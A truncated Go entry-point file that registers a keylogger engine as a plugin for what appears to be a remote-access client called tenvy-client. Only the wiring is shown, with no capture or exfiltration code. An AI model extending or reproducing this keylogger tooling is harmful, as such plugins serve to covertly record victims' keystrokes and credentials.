...
import (
	...
	engine "github.com/rootbay/tenvy-client/internal/plugins/engines/keylogger"
	"github.com/rootbay/tenvy-client/internal/plugins/runner"
)

func main() {
	runner.Run(
		"keylogger-control-engine plugin",
		"keylogger-engine",
		func(logger *log.Logger) engine.Engine {
			return engine.NewKeyloggerEngine(engine.Config{Logger: logger})
		},
